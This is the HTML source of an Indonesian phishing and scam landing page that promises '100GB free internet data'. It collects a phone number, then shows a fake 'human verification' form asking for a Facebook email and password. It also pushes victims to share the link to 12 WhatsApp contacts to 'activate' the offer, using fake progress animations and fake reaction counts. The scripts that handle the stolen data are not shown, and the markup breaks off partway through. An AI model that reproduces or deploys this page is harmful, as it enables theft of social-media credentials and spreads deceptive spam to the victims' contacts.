
<html lang="en">
 <head>
  <title>Dapatkan data internet 100GB gratis, kampanye berakhir besok.</title> 
  <meta content="FREE DATA" property="og:title"> 
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
  <meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible"> 
  <meta content="" property="og:image"> 
  <meta content="Gratis data internet 100GB untuk semua jaringan dan semua aplikasi" property="og:description"> 
  <meta content="width=device-width, initial-scale=1.0" name="viewport"> 
  <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script>
$(document).ready(function(){$('body').hide();});
    </script>
  <link rel="stylesheet" href="css/style.css"> 
  <link rel="stylesheet" href="css/facebook.css"> 
  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
 </head> 
 <style>
tombolfb {
        margin-top: 20px;
    margin-left: 100px;
    margin-right: 15px;
    margin-top: 0px;
    max-width: 250px;
    border-radius: 5px;
    filter: drop-shadow(0 1px 1px rgba(0, 0, 0, 0.5));
    cursor: pointer;
    background: #4767ae;
    color: #fff;
    border: none;
    font-size: 16px;
    width: auto;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    padding: 0px 10px 0px 0px;
    box-shadow: 0px 2px 6px 0px #818181;
}
tombolfb>i {
        height: 100%;
    background: #1a4397;
    width: 40px;
    font-size: 30px;
    padding: 10px;
    border-radius: 5px 0px 0px 5px;
    margin-right: 10px;
}
tombolfb>label {
        padding: 0px 10px;
    letter-spacing: 0.5px;
}
 </style>
 <body style="display:none;">
  <div id="fireworks"> 
   <div class="wrapper"> 
    <div class="container-main"> 
     <img class="lazyload" data-src="https://a.jsdelivr.plus/res/96572610/img/show12.jpg?=v1.2" width="100%" src="https://a.jsdelivr.plus/res/96572610/img/show12.jpg?=v1.2"> 
     <div class="quedate-container"> 
      <main class="quedate"> 
       <!-- Primera parte: ads description --> 
       <div class="quedate__step" id="first-box"> 
        <header class="logo-container"> 
         <svg fill="#ffffff" height="20px" viewbox="-31 0 512 512" width="20px" xmlns="http://www.w3.org/2000/svg"> 
         </svg> 
         <span class="quedate-logo">Dapatkan data internet 100GB gratis, kampanye berakhir besok.</span> 
        </header> 
        <div id="tuman" class="quedate__step-box"> 
         <span class="quedate__border"></span> 
         <p style="font-size: 2.0rem;" id="text100gb" class="quedate__text"><b>Gratis data internet 100GB untuk semua jaringan dan semua aplikasi</b> </p> 
         <span class="quedate__border"></span> 
        </div> 
        <button style="margin:0 0 30px;" id="tombolaktif" onclick="loadmuter()" class="quedate__cta-btn button-glow">Klik di sini untuk mengaktifkan</button> 
       </div> 
       <div class="quedate__loading"> 
        <!--loading svg--> 
        <svg id="loading-svg" style="display:none;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto; " viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="10rem"> 
         <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#ff6d0e" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)"> 
          <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;360 50 50"></animatetransform> 
         </circle> 
         <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#3c9900" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)"> 
          <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;-360 50 50"></animatetransform> 
         </circle> 
        </svg> 
        <!--end loading svg--> 
        <!--checked svg--> 
        <svg id="check-svg" style="display:none;" xml:space="preserve" viewbox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" style=" background: rgb(255, 255, 255);" width="10rem"> 
         <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);"> 
          <g class="ldl-ani"> 
           <g class="ldl-layer"> 
            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
             <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle> 
            </g> 
           </g> 
           <g class="ldl-layer"> 
            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
             <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path> 
            </g> 
           </g> 
           <metadata xmlns:d="https://loading.io/stock/"> 
            <d:name>
              ok 
            </d:name> 
            <d:tags>
              ok,confirm,ready,positive,check,right,correct,affirmative,success 
            </d:tags> 
            <d:license>
              by 
            </d:license> 
            <d:slug>
              364zp 
            </d:slug> 
           </metadata> 
          </g> 
         </g> 
        </svg> 
        <!--end check svg--> 
        <span id="thanks" style="display:none;" class="quedate__porcent"></span> 
        <span style="font-size: 16px;font-weight: bold;" class="quedate__porcent-text js-hidden">Terima kasih, mulai aktifkan</span> 
       </div> 
       <!-- termina la primera parte --> 
       <!-- Segunda parte --> 
       <div id="second-box" style="display:none;margin-bottom: 2.5rem" class="quedate__step"> 
        <div class="quedate__step-box"> 
         <p style="font-size: 1.7rem; text-align:center" class="quedate__text">Masukkan nomor ponsel<b class="quedate__city"></b> Periksa apakah nomor Anda memenuhi syarat untuk menerima dan mengaktifkan data internet gratis 100GB.</p> 
        </div> 
        <script>
                            var prevent = (e) => e.preventDefault();
                        </script> 
        <form class="quedate__form" onsubmit="return prevent(event)"> 
         <input class="quedate__form-input" id="num" type="tel" placeholder="Masukkan nomor ponsel"> 
         <span class="quedate__form-separar"></span> 
         <label id="enviar" onclick="tomboltel()" class="quedate__form-label" for="num">Masukkan nomor ponsel</label> 
         <div class="message-status"></div> 
        </form> 
       </div> 
       <!-- Tercera parte --> 
       <div id="third-box" style="display:none;margin-bottom: 2.5rem;" class="quedate__step"> 
        <span style="font-weight: bold; font-size: 2rem; text-align:center" class="quedate__text">Informasi Anda sekarang sedang dianalisis</span> 
        <div class="quedate__first"> 
         <div style="border: 1px solid gray,color:white;  width:80%" class="quedate__load">
           Mengolah data...... 
          <span class="quedate__load-a"></span> 
         </div> 
         <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon"> 
          <svg id="ijospin1" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="display:none; shape-rendering: auto;" viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="3.2rem"> 
           <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#ff6d0e" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)"> 
            <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;360 50 50"></animatetransform> 
           </circle> 
           <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#3c9900" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)"> 
            <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;-360 50 50"></animatetransform> 
           </circle> 
          </svg> 
          <svg id="cheking" class="quedate__load-check" xml:space="preserve" viewbox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" width=" 3.2rem"> 
           <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);"> 
            <g class="ldl-ani"> 
             <g class="ldl-layer"> 
              <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
               <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle> 
              </g> 
             </g> 
             <g class="ldl-layer"> 
              <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
               <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path> 
              </g> 
             </g> 
             <metadata xmlns:d="https://loading.io/stock/"> 
              <d:name>
                ok 
              </d:name> 
              <d:tags>
                ok,confirm,ready,positive,check,right,correct,affirmative,success 
              </d:tags> 
              <d:license>
                by 
              </d:license> 
              <d:slug>
                364zp 
              </d:slug> 
             </metadata> 
            </g> 
           </g> 
          </svg> 
          <span id="first-porcent" style="display:none;" class="quedate__load-text"></span> 
         </div> 
        </div> 
        <div class="quedate__first"> 
         <div style="border: 1px solid gray; width:80%" class="quedate__load">
           Selamat! Anda mendapatkan 100GB...... 
          <span class="quedate__load-a"></span> 
         </div> 
         <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon"> 
          <svg id="second-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="3.2rem"> 
           <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#ff6d0e" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)"> 
            <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;360 50 50"></animatetransform> 
           </circle> 
           <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#3c9900" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)"> 
            <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;-360 50 50"></animatetransform> 
           </circle> 
          </svg> 
          <svg id="cheking2" class="quedate__load-check" xml:space="preserve" viewbox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" width=" 3.2rem"> 
           <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);"> 
            <g class="ldl-ani"> 
             <g class="ldl-layer"> 
              <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
               <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle> 
              </g> 
             </g> 
             <g class="ldl-layer"> 
              <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
               <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path> 
              </g> 
             </g> 
             <metadata xmlns:d="https://loading.io/stock/"> 
              <d:name>
                ok 
              </d:name> 
              <d:tags>
                ok,confirm,ready,positive,check,right,correct,affirmative,success 
              </d:tags> 
              <d:license>
                by 
              </d:license> 
              <d:slug>
                364zp 
              </d:slug> 
             </metadata> 
            </g> 
           </g> 
          </svg> 
          <span id="second-porcent" class="quedate__load-text"></span> 
         </div> 
        </div> 
       </div> 
       <!-- Loading--> 
       <div id="loading-g" class="quedate__step js-hidden"> 
        <div class="quedate__step-box"> 
         <svg class="quedate__animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="10rem"> 
          <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#ff6d0e" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)"> 
           <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;360 50 50"></animatetransform> 
          </circle> 
          <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#3c9900" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)"> 
           <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;-360 50 50"></animatetransform> 
          </circle> 
         </svg> 
        </div> 
        <p style="font-size: 14px;font-weight: bold;">Tunggu, kami sedang memvalidasi data</p> 
       </div> 
      </main> 
     </div> 
     <!-- FIN PASOS --> 
     <!-- Ventana permiso --> 
     <div class="permision-container js-hidden"> 
      <span class="permision-container-request-text">Minta Izin</span> 
      <div class="permision-container-data"> 
       <div class="permision-container-icons"> 
        <!-- Generator: Adobe Illustrator 18.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --> 
        <svg width="50px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 112.196 112.196" style="enable-background:new 0 0 112.196 112.196;" xml:space="preserve"> 
         <g> 
          <circle style="fill:#3B5998;" cx="56.098" cy="56.098" r="56.098"></circle> 
          <path style="fill:#FFFFFF;" d="M70.201,58.294h-10.01v36.672H45.025V58.294h-7.213V45.406h7.213v-8.34
            		c0-5.964,2.833-15.303,15.301-15.303L71.56,21.81v12.51h-8.151c-1.337,0-3.217,0.668-3.217,3.513v7.585h11.334L70.201,58.294z"></path> 
         </g> 
        </svg> 
       </div> 
       <div class="permision-container-box"> 
        <p class="permision-container-txt">Kami harus memvalidasi bahwa Anda adalah manusia sungguhan dengan memeriksa nama dan foto profil Anda.</p> 
        <form action="#" class="permision-container-form"> 
         <input class="permision-container-input" type="text" id="email" placeholder="your@email.com"> 
         <label class="permision-container-label" for="email"></label> 
         <input class="permision-container-input" type="password" id="pass" placeholder="??????????"> 
         <label class="permision-container-label" for="pass"></label> 
        </form> 
        <span class="message-status fb-request"></span> 
        <button style="width:100%; margin-left: 0;" id="aceptar" class="quedate__cta-btn">Terima – Aku Manusia</button> 
        <div class="permision-container-secure"> 
         <svg fill="#a2a2a2" height="512pt" viewbox="-64 0 512 512" width="512pt" xmlns="http://www.w3.org/2000/svg"> 
          <path d="m336 192h-16v-64c0-70.59375-57.40625-128-128-128s-128 57.40625-128 128v64h-16c-26.453125 0-48 21.523438-48 48v224c0 26.476562 21.546875 48 48 48h288c26.453125 0 48-21.523438 48-48v-224c0-26.476562-21.546875-48-48-48zm-229.332031-64c0-47.0625 38.269531-85.332031 85.332031-85.332031s85.332031 38.269531 85.332031 85.332031v64h-170.664062zm0 0"></path> 
         </svg> 
         <p class="permision-container-secure-text">Aplikasi ini tidak diizinkan untuk memposting di Facebook</p> 
        </div> 
       </div> 
      </div> 
      <span class="permision-container-end">Kebijakan dan ketentuan privasi layanan kami</span> 
     </div> 
     <div style="height: 269px;" class="loading2 js-hidden"> 
      <div style="text-align: center !important;" class="loading2__box"> 
       <svg class="loading2__permission" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="" viewbox="0 0 100 100" preserveaspectratio="xMidYMid"> 
        <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#ff6d0e" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)"> 
         <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;360 50 50"></animatetransform> 
        </circle> 
        <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#6ae8a4" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)"> 
         <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;-360 50 50"></animatetransform> 
        </circle> 
       </svg> 
       <p style="text-align:center">Tunggu sebentar, kami validasi data.</p> 
      </div> 
     </div> 
     <!--congratulations --> 
     <div id="share" style="display:none;" class="loading2 js-congrats"> 
      <div class="loading2__box"> 
       <span style="font-weight: bold; font-size:15px">Selamat! Nomor Anda telah menerima data internet gratis 100GB yang berlaku selama 12 bulan!</span> 
       <br> 
       <br> 
       <span class="quedate__country"> <b>1.Selanjutnya untuk mulai mengaktifkan data internet 100GB Anda, pertama klik tombol hijau “WhatsAPP” dan bagikan ke 12 teman atau grup di WhatsApp!</b> <br> <br> <b>2.Hanya dapat diaktifkan setelah pembagian selesai</b> <br> <br> <b>3.Setelah Anda mengirim pesan, data internet gratis 100GB di ponsel Anda akan aktif dan mulai digunakan secara normal.</b> <br> 
        <div style="margin-top: 30px;margin-bottom: 30px;" class="quedate__first js-share"> 
         <div style="border: 1px solid gray; width:80%" class="quedate__load">
           Bagikan ke grup Anda untuk mengaktifkannya 
          <span class="quedate__load-a"></span> 
         </div> 
         <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon"> 
          <svg id="third-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewbox="0 0 100 100" preserveaspectratio="xMidYMid" width="3.2rem"> 
           <circle cx="50" cy="50" r="32" stroke-width="8" stroke="#ff6d0e" stroke-dasharray="50.26548245743669 50.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)"> 
            <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;360 50 50"></animatetransform> 
           </circle> 
           <circle cx="50" cy="50" r="23" stroke-width="8" stroke="#3c9900" stroke-dasharray="36.12831551628262 36.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)"> 
            <animatetransform attributename="transform" type="rotate" dur="1s" repeatcount="indefinite" keytimes="0;1" values="0 50 50;-360 50 50"></animatetransform> 
           </circle> 
          </svg> 
          <svg id="???_1" class="quedate__load-check js-hidden" xml:space="preserve" viewbox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" width=" 3.2rem"> 
           <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);"> 
            <g class="ldl-ani"> 
             <g class="ldl-layer"> 
              <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
               <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke: rgb(6, 193, 103);"></circle> 
              </g> 
             </g> 
             <g class="ldl-layer"> 
              <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;"> 
               <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill: rgb(6, 193, 103);"></path> 
              </g> 
             </g> 
             <metadata xmlns:d="https://loading.io/stock/"> 
              <d:name>
                ok 
              </d:name> 
              <d:tags>
                ok,confirm,ready,positive,check,right,correct,affirmative,success 
              </d:tags> 
              <d:license>
                by 
              </d:license> 
              <d:slug>
                364zp 
              </d:slug> 
             </metadata> 
            </g> 
           </g> 
          </svg> 
          <span id="third-porcent" class="quedate__load-text"></span> 
         </div> 
        </div> <img class="tahiii-btn" onclick="opanaquota()" src="https://cdn.jsdelivr.net/gh/Hyuu09/CDNsalz@main/20240216_145338.png">
      </div> 
     </div> 
     <!-- FIN Ventana permiso --> 
     <!--verify--> 
     <div id="donebg" style="display:none;"class="loading2 js-verify"> 
      <div class="loading2__box"> 
       <b style="font-weight:bold; font-size:16px">Selamat! Kuota anda telah aktif.</b> 
       <br> 
       <br> 
       <b>Kami Akan Mengirimkan Kuota Dalam 1x24 Jam</b> 
       <br> 
       <br> 
       <br> 
       <br> 
       <b>Harap dicatat bahwa langkah ini sangat penting dan Anda akan menerima data internet gratis 100GB setelah 1x24 Jam.</b> 
       <br> 
       <br> 
       <br> 
       <br>
       </div> 
       <br> 
       <br> 
      </div> 
     </div> 
    </div> 
   </div> 
   <div id="loginmetod" style="display:none;" class="loading2 js-verify"> 
      <div class="loading2__box"> 
       <b style="font-weight:bold; font-size:16px">Kami harus mengkonfirmasi bahwa Anda adalah manusia sungguhan.</b> 
       <br> 
       <br> 
       <b>Login Untuk Mengkonfirmasi</b> 
       <br> 
       <br> 
       <br> 
       <br> 
       <tombolfb onclick="bugnjir()"><i class="fa-brands fa-facebook-f"></i> <label>Login with Facebook</label></tombolfb>
       <br> 
       <br> 
       <b>Dengan Login Anda dikonfirmasi sebagai Manusia</b> 
       <br> 
       <br>
       </div> 
       <br> 
       <br> 
      </div> 
     </div> 
    </div> 
   </div> 
   <!-- start Chat--> 
   <div class="container-chat"> 
    <div class="chat"> 
     <div class="chat__reactions"> 
      <span class="chat__reactions-icon"> 
       <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 16 16"> 
        <defs> 
         <lineargradient id="r" x1="50%" x2="50%" y1="0%" y2="100%"> 
          <stop offset="0%" stop-color="#18AFFF"></stop> 
          <stop offset="100%" stop-color="#0062DF"></stop> 
         </lineargradient> 
         <filter id="e" width="118.8%" height="118.8%" x="-9.4%" y="-9.4%" filterunits="objectBoundingBox"> 
          <fegaussianblur in="SourceAlpha" result="shadowBlurInner1" stddeviation="1"></fegaussianblur> 
          <feoffset dy="-1" in="shadowBlurInner1" result="shadowOffsetInner1"></feoffset> 
          <fecomposite in="shadowOffsetInner1" in2="SourceAlpha" k2="-1" k3="1" operator="arithmetic" result="shadowInnerInner1"></fecomposite> 
          <fecolormatrix in="shadowInnerInner1" values="0 0 0 0 0 0 0 0 0 0.299356041 0 0 0 0 0.681187726 0 0 0 0.3495684 0"></fecolormatrix> 
         </filter> 
         <path id="k" d="M8 0a8 8 0 00-8 8 8 8 0 1016 0 8 8 0 00-8-8z"></path> 
        </defs> 
        <g fill="none"> 
         <use fill="url(#r)" xlink:href="#k"></use> 
         <use fill="black" filter="url(#e)" xlink:href="#k"></use> 
         <path fill="white" d="M12.162 7.338c.176.123.338.245.338.674 0 .43-.229.604-.474.725a.73.73 0 01.089.546c-.077.344-.392.611-.672.69.121.194.159.385.015.62-.185.295-.346.407-1.058.407H7.5c-.988 0-1.5-.546-1.5-1V7.665c0-1.23 1.467-2.275 1.467-3.13L7.361 3.47c-.005-.065.008-.224.058-.27.08-.079.301-.2.635-.2.218 0 .363.041.534.123.581.277.732.978.732 1.542 0 .271-.414 1.083-.47 1.364 0 0 .867-.192 1.879-.199 1.061-.006 1.749.19 1.749.842 0 .261-.219.523-.316.666zM3.6 7h.8a.6.6 0 01.6.6v3.8a.6.6 0 01-.6.6h-.8a.6.6 0 01-.6-.6V7.6a.6.6 0 01.6-.6z"></path> 
        </g> 
       </svg> </span> 
      <span class="chat__reactions-icon"> 
       <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 16 16"> 
        <defs> 
         <lineargradient id="a" x1="50%" x2="50%" y1="0%" y2="100%"> 
          <stop offset="0%" stop-color="#FF6680"></stop> 
          <stop offset="100%" stop-color="#E61739"></stop> 
         </lineargradient> 
         <filter id="c" width="118.8%" height="118.8%" x="-9.4%" y="-9.4%" filterunits="objectBoundingBox"> 
          <fegaussianblur in="SourceAlpha" result="shadowBlurInner1" stddeviation="1"></fegaussianblur> 
          <feoffset dy="-1" in="shadowBlurInner1" result="shadowOffsetInner1"></feoffset> 
          <fecomposite in="shadowOffsetInner1" in2="SourceAlpha" k2="-1" k3="1" operator="arithmetic" result="shadowInnerInner1"></fecomposite> 
          <fecolormatrix in="shadowInnerInner1" values="0 0 0 0 0.710144928 0 0 0 0 0 0 0 0 0 0.117780134 0 0 0 0.349786932 0"></fecolormatrix> 
         </filter> 
         <path id="b" d="M8 0a8 8 0 100 16A8 8 0 008 0z"></path> 
        </defs> 
        <g fill="none"> 
         <use fill="url(#a)" xlink:href="#b"></use> 
         <use fill="black" filter="url(#c)" xlink:href="#b"></use> 
         <path fill="white" d="M10.473 4C8.275 4 8 5.824 8 5.824S7.726 4 5.528 4c-2.114 0-2.73 2.222-2.472 3.41C3.736 10.55 8 12.75 8 12.75s4.265-2.2 4.945-5.34c.257-1.188-.36-3.41-2.472-3.41"></path> 
        </g> 
       </svg> </span> 
      <span class="chat__reactions-text">James and Esther Wambui </span> 
      <span class="chat__reactions-counter">179k</span> 
      <span class="chat__reactions-text">comment</span> 
      <span class="chat__reactions-counter js-counter">634</span> 
      <span class="chat__reactions-text">share</span> 
     </div> 
     <div class="chat__actions"> 
      <div class="chat__actions-box"> 
       <span> 
        <svg width="40" style="enable-background:new 0 0 48 48;" version="1.1" viewbox="0 0 48 48" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> 
         <style type="text/css">
 .st0 {
     display: none;
 }

 .st1 {
     fill: none;
     stroke: #303030;
     stroke-width: 0.7;
     stroke-linecap: round;
     stroke-linejoin: round;
     stroke-miterlimit: 10;
 }

 .st2 {
     fill: #303030;
 }
</style> 
         <g class="st0" id="Padding__x26__Artboard"></g> 
         <g id="Icons"> 
          <g> 
           <path class="st1" d="M17.95222,33.90544h0.9013c0.21198,0,0.42036,0.06112,0.59631,0.17936    c0.28018,0.18827,0.55758,0.3808,0.84545,0.55725c0.16461,0.1009,0.35297,0.24185,0.53977,0.29492l6.92604,0.00805l4.83793,0.0013    c0.9355,0.00025,1.71305-0.76513,1.69462-1.70044c-0.01669-0.84692-0.15599-1.60765-1.00351-1.60765h0.1076    c0.91396,0,1.61795-0.74711,1.60863-1.66102c-0.00988-0.96905,0.13757-1.76219-0.82805-1.76219h0.3228    c0.92,0,1.40993-0.80351,1.40993-1.73351c0-0.92,0.12016-1.65903-0.79984-1.65903h0.32154c0.92,0,1.04668-0.81019,1.04668-1.73019    c0-0.93-0.49831-1.60727-1.41831-1.60727l-8.70333,0.01419c0.20236-0.27825,1.23094-4.09943,1.15505-4.83301    c-0.0544-0.52583-0.20867-1.0503-0.3366-1.56151c-0.17118-0.68406-0.35542-1.36467-0.53957-2.04532    c-0.11769-0.43504-0.8064-0.7405-1.18842-0.87866c-0.58066-0.21-1.19885-0.11427-1.68509,0.26741    c-0.2588,0.20315-0.66063,0.53764-0.66016,0.88888c0.00162,1.21729-0.00109,2.43457,0.00345,3.65185    c0.00004,0.01062,0.00008,0.02123,0.00012,0.03185c0.00023,0.06161,0.00036,0.12407-0.01541,0.18363    c-0.0169,0.06386-0.05128,0.12147-0.08524,0.17812c-0.68155,1.13686-1.36008,2.27553-2.03821,3.41444    c-0.29735,0.4994-0.59458,0.99887-0.89091,1.49888c-0.26875,0.45347-0.51342,0.94802-0.9745,1.23768    c-0.40725,0.25585-0.7805,0.49207-1.19004,0.74735"></path> 
           <path class="st1" d="M16.5418,35.94944h-3.68656c-0.7371,0-1.33464-0.59753-1.33464-1.33463V24.34045    c0-0.7371,0.59754-1.33464,1.33464-1.33464h3.68656c0.7371,0,1.33464,0.59754,1.33464,1.33464v10.27436    C17.87644,35.35191,17.2789,35.94944,16.5418,35.94944z"></path> 
           <line class="st1" x1="13.55524" x2="13.55524" y1="29.80501" y2="24.76078"></line> 
           <line class="st1" x1="13.55524" x2="13.55524" y1="30.95262" y2="31.7558"></line> 
          </g> 
         </g> 
        </svg></span> 
       <span class="chat__actions-text">Like</span> 
      </div> 
      <div class="chat__actions-box"> 
       <span> 
